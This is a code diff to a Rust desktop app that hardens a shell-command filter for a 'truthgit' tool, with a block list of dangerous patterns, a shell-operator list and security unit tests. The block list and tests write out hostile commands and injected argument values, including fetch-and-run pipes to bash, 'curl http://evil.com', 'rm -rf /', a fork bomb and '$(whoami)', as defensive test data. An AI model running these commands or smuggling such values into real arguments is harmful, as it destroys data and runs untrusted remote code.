@@ -789,15 +789,14 @@ const DANGEROUS_PATTERNS: &[&str] = &[
     "rm -r /",
     "sudo rm -rf",
     "> /dev/sd",
-    "> /dev/null",  // Allow this one - it's safe, will be excluded below
     "mkfs",
     "dd if=",
     ":(){:|:&};:",  // Fork bomb
     "chmod -R 777 /",
-    "curl | bash",
-    "curl|bash",
-    "wget | bash",
-    "wget|bash",
+    "| bash",       // Pipe to bash (catches curl ... | bash, wget ... | bash, etc.)
+    "| sh",         // Pipe to sh
+    "|bash",        // No space variant
+    "|sh",          // No space variant
     "eval $(",
     "$(curl",
     "$(wget",
@@ -852,10 +851,21 @@ pub struct CommandCheck {
     pub warning: Option<String>,
 }
 
+// Shell operators that should NEVER appear in allowed commands
+const SHELL_OPERATORS: &[&str] = &[";", "&&", "||", "|", "`", "$(", "${", "\n", "\r"];
+
 // Check if command is in the whitelist
 fn is_command_allowed(command: &str) -> bool {
     let cmd_trimmed = command.trim();
 
+    // SECURITY: First reject any command with shell operators (defense in depth)
+    for op in SHELL_OPERATORS {
+        if cmd_trimmed.contains(op) {
+            return false;
+        }
+    }
+
+    // Then check if it starts with an allowed prefix
     for prefix in ALLOWED_COMMAND_PREFIXES {
         if cmd_trimmed.starts_with(prefix) || cmd_trimmed == prefix.trim() {
             return true;
@@ -1048,4 +1058,225 @@ pub fn run() {
         })
         .run(tauri::generate_context!())
         .expect("error while running tauri application");
+}
+
+// ==================== SECURITY TESTS ====================
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // ====== is_command_allowed tests ======
+
+    #[test]
+    fn test_allowed_truthgit_commands() {
+        assert!(is_command_allowed("truthgit status"));
+        assert!(is_command_allowed("truthgit verify \"some claim\""));
+        assert!(is_command_allowed("truthgit safe-verify \"claim\" --risk high"));
+        assert!(is_command_allowed("truthgit prove \"claim\""));
+        assert!(is_command_allowed("truthgit search query"));
+    }
+
+    #[test]
+    fn test_allowed_read_only_commands() {
+        assert!(is_command_allowed("ls"));
+        assert!(is_command_allowed("ls -la"));
+        assert!(is_command_allowed("pwd"));
+        assert!(is_command_allowed("cat file.txt"));
+        assert!(is_command_allowed("head -n 10 file.txt"));
+        assert!(is_command_allowed("tail -f log.txt"));
+        assert!(is_command_allowed("grep pattern file.txt"));
+        assert!(is_command_allowed("find . -name \"*.rs\""));
+    }
+
+    #[test]
+    fn test_allowed_git_commands() {
+        assert!(is_command_allowed("git status"));
+        assert!(is_command_allowed("git log --oneline"));
+        assert!(is_command_allowed("git diff HEAD"));
+        assert!(is_command_allowed("git branch -a"));
+        assert!(is_command_allowed("git show HEAD"));
+    }
+
+    #[test]
+    fn test_allowed_info_commands() {
+        assert!(is_command_allowed("date"));
+        assert!(is_command_allowed("whoami"));
+        assert!(is_command_allowed("hostname"));
+        assert!(is_command_allowed("uname -a"));
+        assert!(is_command_allowed("which python"));
+        assert!(is_command_allowed("python --version"));
+        assert!(is_command_allowed("node --version"));
+    }
+
+    #[test]
+    fn test_blocked_dangerous_commands() {
+        // These should NOT be allowed (not in whitelist)
+        assert!(!is_command_allowed("rm file.txt"));
+        assert!(!is_command_allowed("rm -rf /"));
+        assert!(!is_command_allowed("sudo anything"));
+        assert!(!is_command_allowed("chmod 777 file"));
+        assert!(!is_command_allowed("chown user file"));
+        assert!(!is_command_allowed("wget http://evil.com"));
+        assert!(!is_command_allowed("curl http://evil.com"));
+        assert!(!is_command_allowed("apt install package"));
+        assert!(!is_command_allowed("npm install package"));
+        assert!(!is_command_allowed("pip install package"));
+    }
+
+    #[test]
+    fn test_blocked_shell_operators() {
+        // Commands with shell operators should not be in whitelist
+        assert!(!is_command_allowed("ls; rm -rf /"));
+        assert!(!is_command_allowed("echo hello && rm file"));
+        assert!(!is_command_allowed("cat file | bash"));
+    }
+
+    // ====== contains_dangerous_pattern tests ======
+
+    #[test]
+    fn test_dangerous_rm_patterns() {
+        assert!(contains_dangerous_pattern("rm -rf /").is_some());
+        assert!(contains_dangerous_pattern("rm -r /home").is_some());
+        assert!(contains_dangerous_pattern("sudo rm -rf anything").is_some());
+        assert!(contains_dangerous_pattern("ls && rm -rf /tmp").is_some());
+    }
+
+    #[test]
+    fn test_dangerous_injection_patterns() {
+        assert!(contains_dangerous_pattern("curl http://x.com | bash").is_some());
+        assert!(contains_dangerous_pattern("wget http://x.com|bash").is_some());
+        assert!(contains_dangerous_pattern("eval $(curl http://x.com)").is_some());
+        assert!(contains_dangerous_pattern("$(curl http://x.com)").is_some());
+        assert!(contains_dangerous_pattern("$(wget http://x.com)").is_some());
+    }
+
+    #[test]
+    fn test_dangerous_sudo_patterns() {
+        assert!(contains_dangerous_pattern("sudo su").is_some());
+        assert!(contains_dangerous_pattern("sudo -i").is_some());
+        assert!(contains_dangerous_pattern("sudo bash").is_some());
+    }
+
+    #[test]
+    fn test_dangerous_chained_commands() {
+        assert!(contains_dangerous_pattern("; rm -rf /").is_some());
+        assert!(contains_dangerous_pattern("&& rm -rf /tmp").is_some());
+        assert!(contains_dangerous_pattern("| rm file").is_some());
+        assert!(contains_dangerous_pattern("`rm file`").is_some());
+    }
+
+    #[test]
+    fn test_safe_commands_pass() {
+        assert!(contains_dangerous_pattern("ls -la").is_none());
+        assert!(contains_dangerous_pattern("truthgit status").is_none());
+        assert!(contains_dangerous_pattern("git log").is_none());
+        assert!(contains_dangerous_pattern("cat file.txt").is_none());
+        // /dev/null is explicitly allowed
+        assert!(contains_dangerous_pattern("command > /dev/null").is_none());
+    }
+
+    #[test]
+    fn test_fork_bomb_blocked() {
+        assert!(contains_dangerous_pattern(":(){:|:&};:").is_some());
+    }
+
+    // ====== validate_truthgit_args tests ======
+
+    #[test]
+    fn test_valid_truthgit_args() {
+        assert!(validate_truthgit_args(&vec!["status".to_string()]).is_ok());
+        assert!(validate_truthgit_args(&vec!["verify".to_string(), "claim".to_string()]).is_ok());
+        assert!(validate_truthgit_args(&vec![
+            "safe-verify".to_string(),
+            "claim".to_string(),
+            "--risk".to_string(),
+            "high".to_string()
+        ]).is_ok());
+        assert!(validate_truthgit_args(&vec!["--help".to_string()]).is_ok());
+        assert!(validate_truthgit_args(&vec!["version".to_string()]).is_ok());
+    }
+
+    #[test]
+    fn test_invalid_subcommands() {
+        assert!(validate_truthgit_args(&vec!["init".to_string()]).is_err());
+        assert!(validate_truthgit_args(&vec!["config".to_string()]).is_err());
+        assert!(validate_truthgit_args(&vec!["delete".to_string()]).is_err());
+        assert!(validate_truthgit_args(&vec!["rm".to_string()]).is_err());
+    }
+
+    #[test]
+    fn test_empty_args_rejected() {
+        assert!(validate_truthgit_args(&vec![]).is_err());
+    }
+
+    #[test]
+    fn test_injection_in_args_blocked() {
+        // Semicolon injection
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "claim; rm -rf /".to_string()
+        ]).is_err());
+
+        // && injection
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "claim && malicious".to_string()
+        ]).is_err());
+
+        // Pipe injection
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "claim | bash".to_string()
+        ]).is_err());
+
+        // Backtick injection
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "`whoami`".to_string()
+        ]).is_err());
+
+        // $() injection
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "$(whoami)".to_string()
+        ]).is_err());
+
+        // ${} injection
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "${HOME}".to_string()
+        ]).is_err());
+
+        // Redirect injection
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "> /etc/passwd".to_string()
+        ]).is_err());
+
+        // Newline injection
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "claim\nrm -rf /".to_string()
+        ]).is_err());
+    }
+
+    #[test]
+    fn test_normal_claims_allowed() {
+        // Normal claims with special characters that ARE allowed
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "Water boils at 100°C".to_string()
+        ]).is_ok());
+
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "The speed of light is 299,792,458 m/s".to_string()
+        ]).is_ok());
+
+        assert!(validate_truthgit_args(&vec![
+            "verify".to_string(),
+            "E = mc²".to_string()
+        ]).is_ok());
+    }
 }
